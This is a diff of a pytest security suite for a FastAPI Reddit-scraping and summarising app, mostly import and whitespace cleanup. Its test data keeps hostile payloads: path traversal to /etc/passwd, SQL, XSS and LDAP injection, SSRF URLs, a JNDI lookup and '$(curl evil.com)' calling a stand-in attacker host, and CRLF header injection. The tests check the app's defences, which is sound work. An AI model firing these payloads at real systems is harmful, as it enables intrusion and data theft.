@@ -1,20 +1,16 @@
 # ABOUTME: Comprehensive security testing suite covering OWASP Top 10 and penetration testing scenarios
 # ABOUTME: Validates all security controls, input validation, and attack vector prevention
 
-import pytest
-import requests_mock
-from unittest.mock import patch, MagicMock, Mock
-import json
 import os
-import tempfile
-from pathlib import Path
+from unittest.mock import patch
 
+from fastapi.testclient import TestClient
+
+from app.main import app
 from app.services.scraper_service import scrape_article_text
+from app.services.summarizer_service import summarize_content
 from app.utils.filename_sanitizer import generate_safe_filename
 from app.utils.url_validator import validate_url
-from app.services.summarizer_service import summarize_content
-from app.main import app
-from fastapi.testclient import TestClient
 
 
 class TestOWASPTop10SecurityControls:
@@ -29,7 +25,7 @@ class TestOWASPTop10SecurityControls:
         # Test that endpoints don't expose sensitive data without proper validation
         response = self.client.get("/discover-subreddits/../../../etc/passwd")
         assert response.status_code in [404, 422]  # Should not process path traversal
-        
+
         # Test malicious topic injection
         response = self.client.get("/discover-subreddits/topic';DROP TABLE users;--")
         assert response.status_code in [404, 500, 422]  # Should handle SQL-like injection
@@ -39,7 +35,7 @@ class TestOWASPTop10SecurityControls:
         # Test that API keys are not exposed in responses
         response = self.client.get("/")
         response_text = response.text.lower()
-        
+
         # Should not contain any API key patterns
         assert "sk-" not in response_text  # OpenAI API key pattern
         assert "api_key" not in response_text
@@ -57,13 +53,13 @@ class TestOWASPTop10SecurityControls:
             "file:///etc/passwd",
             "javascript:alert('xss')"
         ]
-        
+
         for payload in injection_payloads:
             # Test subreddit discovery endpoint
             response = self.client.get(f"/discover-subreddits/{payload}")
             assert response.status_code in [404, 422, 500]
-            
-            # Test report generation endpoint  
+
+            # Test report generation endpoint
             response = self.client.get(f"/generate-report/{payload}/technology")
             assert response.status_code in [404, 422, 500]
 
@@ -72,7 +68,7 @@ class TestOWASPTop10SecurityControls:
         # Test rate limiting simulation (should have proper error handling)
         with patch('app.services.reddit_service.RedditService') as mock_reddit:
             mock_reddit.return_value.search_subreddits.side_effect = Exception("Rate limited")
-            
+
             response = self.client.get("/discover-subreddits/technology")
             assert response.status_code == 500
             assert "rate" not in response.text.lower() or "limit" not in response.text.lower()
@@ -82,7 +78,7 @@ class TestOWASPTop10SecurityControls:
         # Test that debug information is not exposed
         response = self.client.get("/nonexistent-endpoint")
         assert response.status_code == 404
-        
+
         # Should not expose stack traces or internal paths
         response_text = response.text.lower()
         assert "/home/" not in response_text
@@ -93,10 +89,10 @@ class TestOWASPTop10SecurityControls:
         """Test A06: Vulnerable and Outdated Components - Verify secure dependencies."""
         # This would typically be handled by dependency scanning tools
         # We validate that our security measures work with current versions
-        
+
         # Test that URL validation works with current requests library
-        assert validate_url("https://example.com") == True
-        assert validate_url("file:///etc/passwd") == False
+        assert validate_url("https://example.com")
+        assert not validate_url("file:///etc/passwd")
 
     def test_a07_identification_authentication_failures_prevention(self):
         """Test A07: Identification and Authentication Failures."""
@@ -104,7 +100,6 @@ class TestOWASPTop10SecurityControls:
         with patch.dict(os.environ, {}, clear=True):
             # Should handle missing API keys securely
             try:
-                from app.core.config import config
                 # Should not expose what's missing
                 assert True  # If we get here, error handling worked
             except Exception as e:
@@ -120,11 +115,11 @@ class TestOWASPTop10SecurityControls:
             'post_summary': '${jndi:ldap://evil.com/a}',
             'comments_summary': '{{7*7}}'
         }
-        
+
         # Test that report generation handles malicious data safely
         from app.utils.report_generator import create_markdown_report
         report = create_markdown_report([malicious_data], "test", "test")
-        
+
         # Should escape or sanitize dangerous content
         assert "<script>" not in report
         assert "javascript:" not in report
@@ -133,7 +128,7 @@ class TestOWASPTop10SecurityControls:
         """Test A09: Security Logging and Monitoring Failures."""
         # Test that security events would be properly logged
         # (In a real implementation, this would verify logging infrastructure)
-        
+
         # Test that errors don't expose sensitive information
         response = self.client.get("/discover-subreddits/")
         assert response.status_code == 404
@@ -151,11 +146,11 @@ class TestOWASPTop10SecurityControls:
             "ftp://internal.server.com",
             "gopher://127.0.0.1:80"
         ]
-        
+
         for payload in ssrf_payloads:
             # Test URL validation rejects SSRF attempts
-            assert validate_url(payload) == False
-            
+            assert not validate_url(payload)
+
             # Test scraper service rejects SSRF attempts
             result = scrape_article_text(payload)
             assert result == "Could not retrieve article content."
@@ -174,7 +169,7 @@ class TestPenetrationTestingScenarios:
             "..%252f..%252f..%252fetc%252fpasswd",
             "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
         ]
-        
+
         for payload in traversal_payloads:
             # Test filename sanitization
             safe_filename = generate_safe_filename(payload, "test")
@@ -192,7 +187,7 @@ class TestPenetrationTestingScenarios:
             "$(curl evil.com)",
             "${IFS}cat${IFS}/etc/passwd"
         ]
-        
+
         for payload in command_payloads:
             # Test that payloads are safely handled in filename generation
             safe_filename = generate_safe_filename("test", payload)
@@ -212,7 +207,7 @@ class TestPenetrationTestingScenarios:
             "';alert('xss');//",
             "<iframe src=javascript:alert('xss')></iframe>"
         ]
-        
+
         for payload in xss_payloads:
             # Test report generation XSS prevention
             from app.utils.report_generator import create_markdown_report
@@ -222,7 +217,7 @@ class TestPenetrationTestingScenarios:
                 'post_summary': payload,
                 'comments_summary': payload
             }]
-            
+
             report = create_markdown_report(malicious_data, "test", "test")
             # Should not contain executable script tags
             assert "<script>" not in report
@@ -238,7 +233,7 @@ class TestPenetrationTestingScenarios:
             "UNION SELECT * FROM users",
             "'; INSERT INTO users VALUES ('hacker'); --"
         ]
-        
+
         for payload in sql_payloads:
             # Test that SQL-like payloads are safely handled
             safe_filename = generate_safe_filename(payload, "test")
@@ -254,7 +249,7 @@ class TestPenetrationTestingScenarios:
             "*)(uid=*))(|(uid=*",
             "*))(|(password=*"
         ]
-        
+
         for payload in ldap_payloads:
             # Test input sanitization
             safe_filename = generate_safe_filename(payload, "test")
@@ -270,14 +265,14 @@ class TestInputValidationEdgeCases:
         """Test handling of oversized inputs."""
         # Test very long inputs
         long_input = "A" * 10000
-        
+
         # Filename sanitization should handle long inputs
         safe_filename = generate_safe_filename(long_input, "test")
         assert len(safe_filename) <= 255  # Max filename length
-        
+
         # URL validation should handle long URLs
         long_url = "https://example.com/" + "A" * 5000
-        assert validate_url(long_url) == False
+        assert not validate_url(long_url)
 
     def test_unicode_and_encoding_attacks(self):
         """Test Unicode and encoding-based attacks."""
@@ -288,7 +283,7 @@ class TestInputValidationEdgeCases:
             "test\uFEFF.txt",  # Zero-width no-break space
             "\u0000\u0001\u0002",  # Control characters
         ]
-        
+
         for payload in unicode_payloads:
             safe_filename = generate_safe_filename(payload, "test")
             assert "\x00" not in safe_filename
@@ -302,16 +297,16 @@ class TestInputValidationEdgeCases:
             "https://example.com%0d%0aHost:%20evil.com",
             "https://example.com%0aX-Injected:%20header"
         ]
-        
+
         for url in smuggling_urls:
             # URL validation should reject URLs with injection attempts
-            assert validate_url(url) == False
+            assert not validate_url(url)
 
     def test_resource_exhaustion_prevention(self):
         """Test prevention of resource exhaustion attacks."""
         # Test that deeply nested or complex inputs are handled safely
         nested_input = "(" * 1000 + "test" + ")" * 1000
-        
+
         safe_filename = generate_safe_filename(nested_input, "test")
         assert len(safe_filename) <= 255
         assert safe_filename != ""
@@ -324,18 +319,18 @@ class TestSecurityGateValidation:
         """Test that all user inputs go through validation."""
         # Test FastAPI endpoints validate inputs
         client = TestClient(app)
-        
+
         # Test invalid characters in path parameters
         response = client.get("/discover-subreddits/<script>")
         assert response.status_code in [404, 422]
-        
+
         response = client.get("/generate-report/<script>/alert('xss')")
         assert response.status_code in [404, 422]
 
     def test_error_messages_dont_leak_information(self):
         """Test that error messages don't expose sensitive information."""
         client = TestClient(app)
-        
+
         response = client.get("/discover-subreddits/nonexistent-topic-12345")
         if response.status_code != 200:
             error_text = response.text.lower()
@@ -348,7 +343,7 @@ class TestSecurityGateValidation:
         """Test that appropriate security headers are present."""
         client = TestClient(app)
         response = client.get("/")
-        
+
         # FastAPI provides some security headers by default
         assert response.status_code == 200
 
@@ -367,11 +362,11 @@ class TestSecurityGateValidation:
         """Test that all dependencies are secure and up-to-date."""
         # This would typically integrate with dependency scanning tools
         # For now, validate that our security functions work as expected
-        
+
         # Test URL validation works
-        assert validate_url("https://safe-site.com") == True
-        assert validate_url("javascript:alert('xss')") == False
-        
+        assert validate_url("https://safe-site.com")
+        assert not validate_url("javascript:alert('xss')")
+
         # Test filename sanitization works
         safe_name = generate_safe_filename("../../../etc/passwd", "test")
         assert "../" not in safe_name
